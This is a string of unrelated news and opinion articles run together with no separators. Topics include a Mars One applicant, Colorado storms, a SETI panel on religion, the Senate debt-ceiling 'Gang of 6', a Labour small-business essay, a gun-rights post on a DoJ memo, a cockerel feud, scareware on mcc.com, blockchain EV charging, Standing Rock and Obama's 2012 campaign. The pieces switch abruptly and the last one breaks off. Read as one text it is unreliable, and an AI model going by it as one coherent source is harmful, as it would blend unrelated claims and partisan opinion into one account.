Dr. Joseph Roche is one of the 705 applicants who have been chosen for a one-way ticket to a new life on Mars, with little home of return to Earth.
Despite the daunting idea and grueling application process, already whittle down from 200,000, the astrophysicist, who works at Trinity College Dublin's School of Education, remains hopeful that he will be one of the final 300 Earthlings chosen for Mars One's project, a new life on the red planet in ten years time.
Roche (28), whose previous experience includes work for NASA's Goddard Space Flight Center, is now playing the waiting game and getting ready for further test by the Dutch non-profit planning this adventure.
He spoke to the Irish Independent about life on Mars:
Among the tests carried out by the Mars One project will be an intensive psychological one, to see if participant live among a few hundred humans and to see if they can live without seeing their families and loved ones again.
Speaking at the Festival of Curiosity in Dublin earlier this year Roche said he idea doesn't weigh on his mind.
He said “I've thought a lot about it in the intervening period and my opinion on it hasn't changed at all,” says Roche.
“It's impossible to even comprehend all the things you'd miss back on Earth as no one has ever had to do it before but I think it becomes a bit more understandable if they think it's something someone is passionate about.
“I know it sounds like a lot to give up but what you'll be gaining as one of the first inter-planetary scientists is immense. Even if they called me right now and said there's a taxi waiting outside, you need to go, I'd go in a heartbeat.”
More recently speaking to young scientists at the Creative Tech Festival in Google's Dublin HQ he said that those successful Mars One astronauts, in ten years time, might not be as isolated as we imagine.
He told the crowd “One thing they've promised you on Mars is Internet and WhatsApp. WhatsApp is how I keep in touch with family and friends on earth, so I'm happy with that."
Roche, who is single, also commented on his relationship status. He said “A lot of people wanting a relationship want commitment, and it's hard if you can't commit to being on the planet. But there are (Mars One) candidates with children and wives who are willing to leave their loved ones behind."
Here's an introductory film for the project, Mars One:
Severe weather ripped through the eastern plains of Colorado on Monday afternoon, with hail and heavy rains in some areas as a tornado watch was posted for several northeastern Colorado counties.
Julesburg, in extreme northeastern Colorado along the Nebraska border, was hit with hail and flooding rains Monday afternoon as dark, ominous storm clouds towered above the plains. Hailstones measuring 2.25 inches pounded the town of Paoli in Phillips County.
A tornado watch in Boulder, Larimer, Logan, Morgan, Phillips, Sedgwick, Washington and Weld counties expired at 8:15 p.m.
Eastern counties in Colorado, including Baca, Bent, Kiowa and Prowers are under a severe thunderstorm watch through midnight.
In Denver, the high temperature Monday climbed to 93 degrees, according to the weather service.
Afternoon rain and thunderstorms are possible across northeastern Colorado throughout the week, but chances increase near the end of the week, according to the NWS.
“Each afternoon, we'll be dodging hailstones as far west as Denver,” said Nazette Rydell, spokeswoman for the National Weather Service in Boulder.
There is a 10 percent chance of rain Tuesday, a 20 percent chance Wednesday and a 30 percent chance Thursday.
Temperatures will gradually drop from a high of 89 on Tuesday to a high of 79 on Friday.
There is a slight chance of rain showers and thunderstorms Friday through Sunday.
The low temperature will be in the high 50s and low 60s all week, according to the NWS.
Saturday's high temperature will be about 85, and Sunday's will be about 87.
Mike Wall just got back from the SETICon II conference where he attended a panel discussion titled, "Would Discovering ET Destroy Earth's Religions?" The panel was comprised of SETI wonks Doug Vakoch and Seth Shostak, along with award-winning Canadian science fiction author Robert J. Sawyer.
Not surprisingly, they collectively agreed that contact with an extraterrestrial intelligence wouldn't do much to change people's religious beliefs -– and that we already have historical examples to prove it.

The connection between religious beliefs and the existence of aliens is an interesting one. It's rooted in a pair of traditional Judeo-Christian tenets: namely, the suggestions that humans are God's one-and-only at the center of all things, and that Creationism offers the most credible explanation for our existence. And as the SETICon panelists admit, both of these convictions have been steadily withering away as our scientific knowledge increases.
Writing in Space.com, Wall reflected on this sentiment:
The Bible, Koran and other sacred texts of the world's major religions stress God's special concern for humanity and for Earth. So the discovery of aliens — microbes on Mars, say, or signals from an intelligent civilization in another solar system — might seem threatening, by implying that we and our planet aren't all that special. But our species has had plenty of time to get used to this idea. Nicolaus Copernicus made perhaps the first powerful case for it in 1543, when his seminal work "On the Revolutions of the Celestial Spheres" showed that Earth revolves around the sun, rather than the other way around. "We haven't been the center of the universe for a while now — four centuries," said panelist Seth Shostak, a senior astronomer at the SETI Institute.

Moreover, given all the recent discoveries of potentially habitable exoplanets, religious notions of human primacy continue to take a beating.
And as Wall correctly notes, even if we do make contact with extraterrestrials, religious folks are unlikely to flinch. Take the false discovery of canals on Mars in the early part of the 20th century, or the possible discovery of microbial life on Mars back in the 1990s. While these weren't proven, they still showed that religious values are entrenched in such a way that massive scientific discoveries will be either ignored outright by the faithful, or somehow made to fit existing beliefs.
Another potent example is Darwin's discovery of natural selection. Darwin's idea was particularly devastating to religions, because it offered a complete explanation for the origin of life. God is completely unnecessary for evolution to work -– that's what makes it such a powerful idea. Yet, over 150 years later, religions are still flourishing, a sign that it's going to take a lot more than a monumental discovery to quash religious sentiment. As Wall notes, "So rather than being shaken to its foundations by the confirmation of life on another planet or moon, organized religion may accept the news, adapt and move on."

Indeed, as Vakoch noted, Baptist theologian Dr. Ostrander would be prepared to make the mental switch:
Dr. Ostrander is adamantly opposed to evolution, and yet he has no problem with the idea of there being extraterrestrials. He says it's as if a couple has one child, and then they decide to have a second child. Is that second child any less special? So too if God decides to have life on our planet, and then another planet, and another planet. It doesn't make us less special.
Be sure to read Wall's entire account of the panel, where he also reflects on the opinions of Seth Shostak and Robert Sawyer.

When Sen. Tom Coburn (R-Okla.) pulled out of the Senate's "Gang of 6" in May, the group's goal of creating a bipartisan plan to shrink the federal deficit was given up for dead. But when the staunch fiscal conservative rejoined the gang on Tuesday, and the six senators (three Republicans and three Democrats) lobbed into the debt-celing fight a viable proposal to cut at least $3.7 trillion over 10 years, President Obama gave the plan his nod of support. The plan would raise $1 trillion in revenue by closing tax loopholes, reduce future Social Security benefits, and slash hundreds of billions of dollars from a variety of federal departments. The proposal's warm reception on Tuesday made for "one of the more exhilarating days of legislative politics we've had in quite some time," says Joe Klein at TIME. Can the enthusiastically greeted proposal get Congress to raise the debt ceiling before the U.S. defaults?
This is Congress' best "escape hatch": The Gang of 6 deals just "may be the deus ex machina that magically resolves the debt-ceiling impasse," says Jon Healey in the Los Angeles Times. It requires partisans on both sides to "stick a fork in their favorite campaign issues," but there are wins for each side, too. "The lateness of the hour (in debt-ceiling terms) could also lead more sober-minded legislators" to embrace this Grand Bargain before the clock runs out.
"The Gang of Six provides a debt-ceiling escape hatch?"
House Republicans will never go for it: Capitol Hill certainly "freaked out" about the Gang of 6's vague, late-entry solution to the debt-ceiling impasse, says Joshua Green at The Atlantic. But it won't solve anything. House Republicans have already emphatically rejected any plan that increases revenue, and the gang's proposal does just that. Plus, there's not enough time left to pass the plan before the Aug. 2 default date — and remember, "that's the huge problem for the time being."
"How to think about the Gang of 6 hype"
But the gang's plan has long-term traction: It's true that the Gang of 6 plans probably won't "be fast-tracked through Congress as part of a bipartisan deal to raise the debt limit," says Brian Beutler at Talking Points Memo. "But its future beyond that is much rosier." If Congress is really serious about reducing the deficit, the plan that both Obama and an "influential conservative" like Coburn can sign onto is "only viable, publicly available framework" to do it.
"Back from the dead? Obama hugs Gang of Six..."
At the moment, it seems one of the big questions is – how Labour are you really? As we couldn't have experienced more viscerally than since 7 May, the party that we love covers a huge spectrum of people from all walks of live, with their different experiences, perspectives and approaches. And it's growing by the day. In an age of such frustration at politics, Jeremy Corbyn can take great heart from and credit for that.
I would argue that two overwhelming challenges for the new leader are, as he has said, to prove the credibility of his alternative economic vision and to harness the experiences, energy and input of his incredible membership. The second can have a huge impact on the first, as most people within the party – from every part of the spectrum – share his aims of a Britain that is more equal, with a long-term growth economy that reduces poverty, reflects our talent and inspires hope.
There is a risk, of course, that people from some parts of the party are left out of this, because they are branded ‘New Labour', Blairites – which has bizarrely become a pejorative term given how much progress our government secured for the country in undeniable fact. Doing so would be an enormous mistake, risking both the quality of our policy offer and our electoral chances. Similarly, I feel that people who didn't vote for Corbyn should try to make a contribution before judging – helping to shape the future of our party, rather than simply abandoning it.
Humbly, I offer my own story and experience as an example. I don't think anyone would describe me as a natural Corbynite! At one point, I wasn't even a natural Labour man by a long shot.
A long time ago (!), I was born in Malaysia, the son of an entrepreneur. My father was an inspiration – he'd built an amazing business in a country where there was a lot of discrimination against people of Chinese descent. After all the effort, sweat and tears he poured into the business, he had to give it away as he, because of his ethnicity, lost the government contracts he relied upon. With his work ethic ingrained in my soul and my mother's advice of ‘you reap what you sow' ringing in my ears – my parents sent me to study in the UK.
However, my experience didn't lead me immediately to Labour, as some may expect. Inspired by my father, I became a serial entrepreneur, with an emphasis, pushing back against our Malaysian experience, of an individual's freedom that led me, quite frankly to be more Conservative than Labour in the late 70s and 80s.
I was quite fortunate that I was able to build a successful career. In my early thirties, I led a management buy-out of an education business and since then have founded several businesses that have employed thousands of people. Yet over the course of my career, I became incredibly disillusioned by the Conservatives of Thatcher and Major – who rather than supporting small businesses that provide so much employment and drive for our economy, seemed to focus exclusively on big corporates. I slowly realised that actually, unless you're one of the big boys already with access to resources and power, the Conservative philosophy of ‘you're on your own' didn't help people of any background achieve their ambitions – especially in the sphere of small business.
Which is why over the years, beginning with the Kinnock era, then into the all-too-brief John Smith years and the winning years of Tony Blair, I gravitated towards Labour. They allied the values that I held – that everyone should be able to live lives (to use the American phrase) in pursuit of happiness – with practical policies in every sphere to deliver that ideal, including small business which was so important to me as an entrepreneur..
Through Labour of that era, I saw that our individual beliefs and ambitions are best and only expressed if they are enabled by a similar societal effort. Our individual success and future cannot be separated from society's success and future as a whole. Ever since, I have committed myself to Labour – as Chair for Chinese for Labour and countless other ways.
Now that Jeremy Corbyn has been elected, though I am not a natural Corbynite, I and others need to continue contributing and shaping the debate. For instance, I share the belief in the need to build a more sustainable economy and that small business should be at the heart of that.
For me, the approach government takes to small businesses really reflects a country's attitude: does it want to be entrepreneurial, confident and creative?
99.9% of private sector businesses are SMEs, employing an estimated 14.4 million people, which is well over half the private sector workforce. It accounts to for nearly half of private sector turnover at £1.6billion (2013). SMEs are the source of a lot of people's reliable livelihoods but also the dominant driver for growth and creativity in our economy. Every national business success – Amstrad; Virgin; Innocent; Ella's Kitchen – began life as a small business – as a glint of ambition in their founder's eye.
Yet start-ups face a huge amount of challenges. For instance 7 out of 10 don't make it through their third year due to lack of working capital, business planning and entrepreneurial skills. This is an area where an active government can use its convening power to give support to ensure that start-ups can fulfil their potential.
An issue Tom Watson addressed very effectively during his Conference speech was how we support micro-business – those that consist of less than 10 people. More than 8 million people work in more than 5 million companies in this country – an existence that can be a source of great innovation and creativity, but can also be a very insecure experience as you fight to make a big enough impact to pay the rent or try to save for a mortgage.
There is a lot we can do to support micro-businesses like this to make their task a little easier, by cutting red tape ensuring that larger organisations (often the clients of micro-businesses) pay their bills on reasonable timescales. They are a vital element of our economy and as Tom said, a vital section of what should be Labour's support base. Highlighting that as a fact is but the first step – constructive engagement must come next.
We were good on small businesses in government and, despite the media stereotyping, also in opposition. Chuka Umunna as Shadow Business Secretary set up Small Business Saturday, which encourages people to buy ‘Small' one Saturday in December. Chuka's bi-partisan initiative was a huge success, with £460m spent in small businesses last December.
It is an effort we need to continue and build on in this Parliament under new leadership. To that end, we are setting up SME for Labour – a group of Labour supporters from every part of the party to offer support, advice and policy suggestions to Angela Eagle and her Shadow Business team.
With a goal of a more sustainable economy at the forefront of our minds, we will look to cover a range of areas, including:
How to make Micro-business a recognised Labour priority – for example by appointing a Shadow Minister for micro-business; ensuring Labour councils have a dedicated leader for this group.
How to catalyse start up growth: potentially by looking at progressive measures around investment relief, using unused council property as start up hubs; reducing red tape and providing greater practical support in managing processes, use governments convening power to enable greater access to sectoral business mentors and advisers.
Expanding the reach of small businesses: the world marketplace wants British expertise, of all sizes. However at the moment, access to other markets tends to be the purview of the bigger organisations. Government can do more to open up and create access opportunities to new and bigger markets for our SMEs.
A partnership economy: as big companies have been making significant deals with educational institutions, so SMEs would benefit as well. How could an active government help SMEs connect with those organisations to ensure they have access to the best in class skills that can help them grow.
In all of these areas, the Labour values of partnership, of internationalism and of the concept of a common endeavour are very much of benefit to business AND to working people of all backgrounds who want to make the most of their talents and potential.
That, for me, is what Labour is all about – bringing each of us a life of success, by building a successful society, together. That's why we're setting up SME for Labour. It's why I will continue to give my all to Labour under the leadership of Jeremy Corbyn.

We've known for almost a decade about the Clinton era's Department of Justice and their report that the 1994 Assault Weapons Ban was ineffective and had no noticeable impact on crime. However, that study has largely been ignored due to its age. Thankfully, Barack Obama's very own Department of Justice authored a memo in January (which has subsequently leaked, and been published by the NRA) in which Greg Ridgeway (the Deputy Director for the National Institute of Justice) went over the various options for increased gun control and voiced an opinion on whether any of the options being discussed would actually reduce crime. And — surprise surprise — the NIJ found that nothing being proposed by the Democrats would do anything to actually reduce crime in the United States. Let me tease out the more juicy bits for you . . .
How about an “assault weapons” ban . . . would that reduce crime? According to the memo:
Since assault weapons are not a major contributor to US gun homicide and the existing stock of guns is large, an assault weapon ban is unlikely to have an impact on gun violence.
There it is in black and white. A clear message from Barack Obama's own DoJ that the “assault weapons” ban he's pushing for would have no real world effect.
How about “smart guns?” You know, those guns that supposedly will only fire for the registered owner? Under the heading of “Smart Guns”:
Unlikely to affect gun crime
And yet, it's still being touted as something that “must be done” to reduce crime.
What about magazine capacity restrictions? Surely that would have the immediate impact on crime that the Democrats are looking for.
In order to have an impact, large capacity magazine regulation needs to sharply curtail their availability to include restrictions on importation, manufacture, sale, and possession. An exemption for previously owned magazines would nearly eliminate any impact. The program would need to be coupled with an extensive buyback of existing large capacity magazines. With an exemption the impact of the restrictions would only be felt when the magazines degrade or when they no longer are compatible with guns in circulation. This would take decades to realize.
In short, due to that pesky Constitutional restriction on the government against illegal search and seizure and ex post facto laws, even a magazine capacity restriction would be pointless.
Again, this isn't anything new. We've been telling you this for the last three years here at TTAG. And now we know that those in charge are getting the exact same advice form their advisers. They just choose to ignore it and push for civilian disarmament anyway.
There are dozens of other priorities they could be working on (like lobs, an actual budget, or maybe the economy) but instead they're focusing their efforts on feel-good, base-pleasing bills that would do nothing to improve the situation in America and would only infringe on the civil rights of millions of law abiding Americans.
The defendant claims there would not be a problem if it had been a British cockerel. File pic
A retired businessman has been given a restraining order in a dispute over his neighbours' cockerel that he claimed made too much noise because it was "not British".
Neil Dymott was cleared of harassment following a trial, but was told by magistrates his behaviour had been "childish, immature and petulant".
The court heard claims the 56-year-old threatened to cut the cockerel's head off and shouted homophobic abuse at Helen Richardson and Paula Holland, who lived next to him in Marchwood, Hampshire.

He was also accused of playing loud music, including the Percy Sledge song When A Man Loves A Woman.
Mr Dymott, who denied both charges of harassment, said he only played loud music on two occasions to drown out the noise of the birds and said he did not swear at his neighbours or insult their sexuality.
However, he did admit calling Ms Richardson "a psycho".
The defendant told the trial he had complained to police himself about the noise created by his neighbours' cockerel and hens and blamed the volume on the type of chicken.
Mr Dymott said: "Those cockerels go off as much as 60 to 70 times an hour. This is not a British bird, these are birds going all the time.
"When they started crowing they do not just crow once, they crow, crow, crow."
He added: "It's the type of chickens - these aren't ordinary little reds, these are colourful, these are Rhode Island reds, these are Plymouth Rocks, these are American reds.
"If these had been a British cockerel and going off at dawn and dusk we wouldn't be here."
The court has heard Ms Richardson and Ms Holland had arranged for the cockerel to be killed in August 2015 but the dispute continued after Mr Dymott alleged they were hiding a cockerel from him.
Image: Paula Holland and Helen Richardson had been in dispute with their neighbour
The trial also heard Mr Dymott and Ms Richardson clashed in her front garden which she said caused her an injury to her arm while the defendant said he suffered a cut lip.
The restraining order imposed by magistrates prohibits Mr Dymott from contacting the two women directly or indirectly for two years.
Chairman of the bench Colin Wyatt said: "Whilst we find some of the actions and behaviour were inappropriate we do not feel this constitutes the offence of harassment."
On the playing of music, he said: "We agree the course of action was childish, immature and petulant."
Mr Wyatt added: "You have to live as neighbours, you need to behave and stop being stupid or petulant.
"Can you get on as neighbours, life is too short."

Do not click on mcc … oh, wait, let's not even create a link here, lest someone be tempted. Do not go there.
Founded in 1982, the Microelectronics and Computer Technology Corporation (safe Wikipedia link) was this country's first computer research and development consortium. It was also the fourth organization of any kind to register a dot-com domain name, having done so nearly 30 years ago on July 11, 1985. MCC researched and developed until the year 2000.
Today that notable domain name is controlled by scam artists pedaling fraudulent antivirus services, a fact that I discovered the hard way when researching a number of the earliest dot-coms. My click on the link that shall not be named locked up my browser, Google Chrome, and produced this frighteningly immovable message that required IT help to dispatch:
Yes, a fairly obvious fake, but not to everyone, as a search on the toll-free “assistance” number revealed.
“Called this number after Norton virus came up,” reported one victim. “Computer started beeping. I fell for it. They charged me $399.99.”
There was also a report of the number being associated with the same scam on a typo-squatting site – close to but not quite weather.com.
One thing I wasn't sure about was whether I, too, had mistyped the MCC address or had indeed landed on the fourth oldest dot-com and it was scareware-infested. Either was possible. After quickly ruling out the option of going back for a second look, I asked an IDG Enterprise colleague, CSO senior writer and Salted Hash blogger Steve Ragan, a former IT security pro himself, if he might go there wearing all the proper protective clothing.
Ragan's finding: Yes, indeed, the former online home of the first computer research and development consortium has a bad case of malware. It's designed to serve up the phony antivirus scam to every third visitor – guess I was lucky – while others get more run-of-the-mill spam or this innocuous looking variant.
The domain name in question is registered to entities in Shanghai and Czechoslovakia .
“I've checked the domains, both are offline,” says Ragan. “The traffic direction script is this URL (altered here): https://XX.dntrax.com/XXXXX=245970fc90ae53b1cf04d6a 5c36197277a018559XX. “This is interesting because it runs over HTTPS, which makes tracking the path a bit tricky. The big number you see is a referral ID, which means it will not serve you the same direction URL twice. You've gotten the scam AV/PC support URL from there. Next time, you might get Walmart Gift Cards, or perhaps an offer to purchase discount drugs or watches - general spam. This ID also helps pay the person(s) running the campaign on the DNTRAX system.”
And then there's the role of DNTX, self-billed as “The Traffic Marketplace.”
“That is the root company controlling the affiliate program that redirected you,” Ragan says. “They are a traffic seller, so the odds are they are hosting criminals. Question is, do they know, or are they clueless? Odds are, as long as the money is there, they don't care who they're hosting.”
It's just one infested site, albeit one with a history, and the scam it hosts only came to my attention because my work took me there. But MCC seems a common acronym – think M-whatever Community College, for example – so it's likely that a fair number of unsuspecting victims tack on dot-com because it's more famous than dot-edu. The machine starts beeping.
And at least some fork over $399.99 to learn a painful lesson.
(UPDATE: Email just received from Jim Grace, director of business development for DNTX: “We have seen your article and thank you for bringing up this problem. Per our Terms Of Service, we do not allow any scareware ads on our network; however, because we are a self-service network there is a chance that one of these ads/advertisers are able to get through our quality control filters. We have terminated the advertiser in question from our network and the domain mcc.com won't show any tech support or scareware ads anymore.”)
Blockchain technology is being used to reduce the carbon footprint by spurring innovation in the electric vehicle market. Blockchainfirst is a company that recently delivered the first peer-to-peer vehicle charging cycle over the Ethereum blockchain.
As of August 2016, the world population reached 7.4 billion and despite factors such as high death rates, the numbers are still rising exponentially. The UN estimates that the world's population living in urban areas is predicted to grow 66 percent by 2050. Assessments like these have become a cause of concern for world leaders, government agencies, and environmentalists. Greener initiatives like electric vehicles (EV) are being proposed as viable solutions to decrease the carbon footprint.
EVs are considered more efficient and environmentally friendly, delivering roughly 59 – 62 percent of the electrical energy to the wheels. That's over triple the 17 – 21 percent of total stored energy that is allocated to the wheels of conventional vehicles. EVs also provide smoother and quieter alternatives to internal combustion engines, don't emit pollutants or hazardous waste, and reduce US energy dependence on foreign countries.
However, despite these benefits to the environment, the market for electric cars has remained sluggish. Limitations to battery-related challenges have placed a damper on the EV market. Driving range, recharge time, and bulk to weight ratios also place a burden on the consumers. These factors, coupled with the lack of affordable and seamless infrastructures, bind the EV market, but the industry could be streamlined and propagated with blockchain enabled charging stations.
On January 16, 2017, multidisciplinary and international firm, Blockchainfirst, delivered the first Peer-to-Peer (P2P) vehicle charging cycle over an Ethereum blockchain and Internet of Things (IoT) charging station. The Ethereum-based multipurpose charging station includes unique features such as fast charging, electric motorbike charging capabilities, payment with digital currency, and an optional IoT oracle with environmental data sensors that monitor the following:
Nitrogen Dioxide (NO2)
Temperature
Humidity
Acoustic light
Pressure
Blockchainfirst charging stations are also enabled for persistent data capturing, which means they are able to obtain exactly how much energy was used during a charging cycle. This makes it possible for suppliers to provide only what's required - a feature that saves money and resources.
Last year, German blockchain startup Slock.it, partnered with energy giant RWE, to create Share&Charge. Both parties collaborated to give digital wallets the ability to “talk” to autonomous electric charging stations. These stations use Ethereum-based smart contracts to facilitate tasks like rentals, making deposits, and charging and obtaining payments. Share&Charge stations are reshaping the billing process of charging stations by offering a solution that would be universally compatible between countries. The project is currently available to the German market and Stephan Tual, CEO of Slock.it, states there are future plans to expand the service to “English-speaking countries."
A collaboration between financial magnate UBS, and German-based energy company, Innogy, along with the global leader in driveline and chassis technology, ZF, recently demonstrated a new eWallet for electric cars. The car eWallet is a paperless and eco-friendly alternative that uses the blockchain to authorize vehicle access to third parties. This enables users to pay on-the-go for highway tolls, parking fees, electric charging, and collection fees for car-sharing. There are also plans to integrate a charging infrastructure prototype in the near future.
According to a report by the multinational professional firm, EY, digital grid investments are expected to increase to an estimated $500 billion worth of investments in the next 5 - 7 years. According to Global Digital Grid Leader, Paul Micallef of EY Global Power and Utilities:
“Competition from new entrants is proving particularly disruptive to utilities, which are traditionally averse to risk and encumbered by regulation. Our survey results indicate that digital grids may be falling victim to this disruption, with 24% of utilities citing competition from non-utility entrants as a top three risk. While it is clear that utilities are feeling the pressure, some are grabbing the bull by the horns and investing in innovative solutions to meet changing customer expectations, drive growth and move toward the digital grid era.”
The EU is also creating more initiatives to make EVs more affordable and appealing to the general population. According to the European Automobile Manufacturers Association:
“Incentives for electrically-chargeable vehicles are now applied in many European countries. The incentives mainly consist of tax reductions and exemptions, as in countries such as Austria or Germany, and bonus payments and premiums for the buyers of electric vehicles in France and the UK.”
More incentives increase funds for research, development, and prototyping for blockchain-based energy sector projects that will assist the EV market. These funds could be used to finance projects that use the EV infrastructure and create Ethereum-based startups who wish to produce cleaner environmental alternatives.
On Sunday, the US Army Corps of Engineers issued a statement announcing it would deny a key permit for the Dakota Access Pipeline. The announcement grants the Standing Rock Sioux a temporary stay in their fight against the pipeline's route, and that stay has a strong chance of becoming a permanent victory.
The Corps' decision represents a victory for the thousands of water protectors that have endured months of grueling conditions—suffering through below-freezing temperatures, nights interrupted by the sounds of planes roaring overhead, being shot by water cannons and rubber bullets—with inspiring determination and radical generosity.
To understand these sacrifices, non-Natives must recognize that the Standing Rock protests have always been about much more than water.
In September 2016, Energy Transfer Partners—the company behind the Pipeline designed to transport oil between North Dakota and Illinois—said the Standing Rock Sioux of North and South Dakota had not proved the Pipeline threatened the Standing Rock Sioux's sacred sites. The Standing Rock Sioux responded by filing evidence such as maps drawn by a cultural expert following an archeological survey. Not 24 hours later, Energy Transfer Partners
began destroying those burial grounds.
As a multiracial Native American woman, I felt this violation viscerally. When I was a little girl, some white teenagers went to the graveyard at St. Clair Missionary Baptist Church in Shepherd, Texas, hardly an hour from my Houston home, and—driven by a mixture of boredom and bigotry—destroyed the historic graves of the African Americans and Native Americans buried there, including those belonging to Sallie, my Cherokee ancestress. I learned then that settlers could do whatever they wanted to me and mine. I can no longer kneel at Sallie's burial place. I can only stand under the shade of the cemetery's pecan trees and pines and wonder where, exactly, she rests. She is lost to me. And now, the ancestors of the Standing Rock Sioux are lost, too. We Indians are sick of losing our relatives. That's what the protests were about.

A few years ago, I traveled to Michigan to attend a Native American academic conference and to do fancy shawl dance at a powwow. At one point during the weekend, Ojibwa tribal elders invited a group of us postgraduates into a longhouse, a spiritual space, where they blessed us in a ceremony. Few people are pessimistic enough to guess accurately what percentage of Native Americans have college degrees. It's eleven. Each of us had been the beneficiary of generations of prayers, and the prayers from the tribal elders hallowed us anew. But we were quickly distracted from the joy and hope of the moment—one of the elders asked us to enter the longhouse next door and pray with the family inside. The son of the family had just died of an overdose.
The legacy of colonialism is everywhere in Indian country. It is present in corporate and government invasions of our territory, as well as in the despair of individuals driven to addiction by generation after generation of injustices. Native Americans often say all life is connected in a web. But I believe so, too, is all death. And until people understand that, they cannot understand that the Dakota Access Pipeline protests represent a struggle that began not in spring 2016 but in fall 1492.
About a century and a half ago, my great-great-great-great-grandfather John Carr, a Texan plantation owner, was on a hunting trip in North Carolina when he decided instead of a deer, he'd bring home a woman. He kidnapped Sallie, forcing her into concubinage.

When we first met, my Cherokee language teacher looked at me and said, “Your name in our language is Sa-li”—the Cherokee version of my ancestress's name. My being given Sallie's moniker reminded me that my ascendant is ever contemporary. And the Dakota Access Pipeline put the women of the Standing Rock Sioux in danger of sharing her fate.
That was because it was likely that the Dakota Access Pipeline, if constructed as planned, would have brought to the Standing Rock Sioux the “man camps” of oil workers that have metastasized across Indian country. John and Sallie's analogues remain among us; man camps are home to decent workers but are also plagued with men who rape and traffic Native American women and girls. Tribal nations have almost no authority to prosecute felonies committed by non-Natives on tribal lands. Nor is this authority granted to states. Federal courts do have jurisdiction over such crimes, but they usually fail to act.
What all this means is it's extremely difficult to prosecute non-Natives who rape Native Americans. One in three Native American women is raped in her lifetime. Nearly 90 percent of those rapists are non-Native.

That's what this protest was about.
We American Indians recognize that the typical non-Native would hardly be willing to drape us in smallpox-infested blankets or shoot us down à la Wounded Knee. But we are also aware that settlers frequently find our humanity inconvenient, awkward, annoying, a drag. We won't shut up about Columbus Day. We leave obnoxious comments on people's Instagram accounts asking them not to misuse our sacred regalia as hipster headdresses. We ruin Halloween with our politically correct whining about Poca-hottie costumes. (That one in three statistics reflects the hypersexualization of Native American women.) Folks try to chill and watch a football game, and we have nothing better to do than protest the name of the Redskins. And now, here we are in the Dakotas getting in the way of jobs and energy independence and profits. We are invisible to others except for when we're standing in the way of something they want, and at those times, it's almost like we can hear settlers thinking to themselves, “Why can't they just go away?” or even, “How are they here bothering us? Aren't they supposed to have vanished already?”
In this context, simply existing is revolutionary. The Standing Rock Sioux not obligingly consenting to die from toxic water or from the violence of man camps is radical.

The rallying cry of the Standing Rock Sioux was “Mni Wiconi”—“Water is life.” Yet the Standing Rock Sioux knew this was not news to the forces behind the Pipeline, Energy Transfer Partners and the U.S. Army Corps of Engineers. Those entities knew water is life because the Army Corps rejected an earlier proposal that would have located the pipeline near predominantly white Bismarck. They feared placing the pipeline close to a white community—ten miles away—risked contaminating its water. So they decided they would move it… a half a mile from the Standing Rock Sioux reservation.
Energy Transfer Partners and the U.S. Army Corps of Engineers knew water is life, but so did the state of Michigan when it decided the people of Flint ought to drink corrosive water conveyed through lead pipes, so does the World Bank as it funds water grabs in Africa. Saying “water is life” only makes a difference when the entity to whom you are saying it cares whether or not you live; it has no effect on people who regard your being alive as an impediment to their pleasures or profits. When your life is seen as an anathema and an anachronism, simply to live is to protest. And we intend to live.

In recent appearances, US President Barack Obama has shown a new willingness to slam Republican opponents and bluntly contrast his ideas and values with theirs. This more aggressive approach will likely be a key part of his 2012 campaign strategy.
ADVERTISING Read more
In 2008, Barack Obama soared to victory on a promise to bring people together and transcend the bitter partisan politics of Washington.
But his 2012 campaign message is likely to be more about contrasts than compromise.
After nearly three years of Republican resistance, mounting Democratic impatience, and a steady stream of discouraging poll numbers and economic forecasts, a freshly combative Obama has emerged this autumn. Zigzagging around the country for fundraisers, speeches, and interviews, the president has been touting his own accomplishments -- something Democratic strategists have long griped he has not done sufficiently – in speeches peppered with enumerations of goals reached and promises kept.
Above all, he has also shown a new willingness to slam his opponents and bluntly break down how he differs from them.
In lieu of results, an economic counter-narrative
Obama's latest appearances have indeed suggested that his campaign will address its most daunting obstacle, the fact that the economy has not significantly rebounded on his watch, by arguing that Republicans would make things worse. At a fundraiser near Seattle, Obama asserted that a Republican president “would fundamentally cripple America in meeting the challenges of the 21st Century”. Around the same time, his campaign team released a memo to the press accusing Republicans of being out of touch with everyday Americans by opposing tax increases on the wealthy and Obama's recently pitched jobs bill. And in a televised interview this week, Obama attacked Republicans for refusing to compromise. “I've tried every step of the way to get the Republican Party to work with me,” he said. “Each time, all we've gotten from them is ‘no'.”
Obama's feisty populist tone reached a climactic pitch during a speech at a high school in Colorado last week. Taking issue with Republicans calling his proposal to increase taxes on the wealthy “class warfare”, Obama drew applause by declaring: “If asking a billionaire to pay the same tax rate as a teacher makes me a warrior for the middle class, I wear it as a badge of honour.”
If for now, at least where the economy is concerned, it looks like Obama is running more on efforts, intentions, and ideas than on results, he does not really have a choice. “The bottom line is that Obama's campaign will have to be about his stewardship of the economy, and how he did the best with the tough hand he was dealt,” explained Ari Berman, an author and political correspondent at prominent left-wing magazine The Nation. “Basically, he'll say: ‘I inherited a mess, it hasn't improved as quickly as you wanted, but we're making progress.'”
‘A contest of values'
Without an improving economy to boast about, the Obama camp is resorting to other arguments to sway hesitant voters. One is that Republicans are too far to the right on social and environmental issues. At the fundraiser in Seattle, the president said the election would be “a contest of values”. And in a speech last weekend at a gay rights event, Obama called for the support of “people who believe in a big and generous and tolerant and ambitious and fact-based America” – a dig at Republican positions on gay issues and climate change.
The Obama campaign is hoping that the emphasis on values and social and environmental issues will solidify support among his disillusioned base. They're also betting that it will help win back independents and moderates in key states like Florida, Virginia, North Carolina, and Colorado, where many such voters are affluent and college-educated. According to Laura Chapin, a Democratic strategist in Colorado, “extremism on social issues is a disqualifier for moderates and independent voters” – even for those receptive to the fiscal conservatism championed by Republican candidates.
The strategy is somewhat of a reversal for Democrats, who have often downplayed their differences with Republicans on controversial social matters in order to appeal to a broader electoral base. But evolving public opinion, as well as more extreme positions expressed by some Republican presidential contenders and even audience members at recent debates, have provided Obama with an opportunity to portray his rivals as too conservative for mainstream America.
Obama made pointed reference to the Republican debates at a fundraiser in California last week, painting a scathing portrait of right-wing candidates and supporters. “You've got a governor whose state is on fire denying climate change,” he said, referring to Texas governor and presidential hopeful Rick Perry, whose home state has been blighted by wildfires. “You've got audiences [at the Republican debates] cheering at the prospect of somebody dying because they don't have healthcare and booing a service member in Iraq because they're gay.” (The soldier had appeared via video to ask the candidates at the debates whether they would choose to re-implement the recently ended “don't ask don't tell” policy, which prevented gay service members from serving openly).
“That's not reflective of who we are,” Obama concluded.
Immunity on foreign policy
